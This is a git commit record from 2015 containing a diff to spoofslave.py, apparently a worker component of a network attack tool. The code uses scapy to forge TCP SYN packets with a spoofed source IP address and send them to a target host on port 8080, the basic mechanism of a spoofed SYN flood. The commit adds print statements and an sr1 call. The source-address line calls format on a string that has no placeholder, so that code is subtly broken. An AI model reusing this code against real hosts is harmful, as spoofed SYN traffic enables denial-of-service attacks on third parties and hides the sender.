804bf2641123f582a99af9f279a52cf2b46b5f99
Calvin <calvin.chan.h@gmail.com>
2015-03-15 17:18:03 -0700

    Trying new things

--- spoofslave.py
+++ spoofslave.py
@@ -51,6 +51,9 @@ class Slave():
             #IP Spoof
             src = "10.1.1.3".format(random.randint(0,255))
             spoofed_SYN =scapy.IP(dst=host,src=src)/scapy.TCP(dport=8080,sport=5000,flags='S')
+            print spoofed_SYN
+            syn_ack= sr1(spoofed_SYN)
+            print syn_ack
             scapy.send(spoofed_SYN)
         except error, msg:
             print error
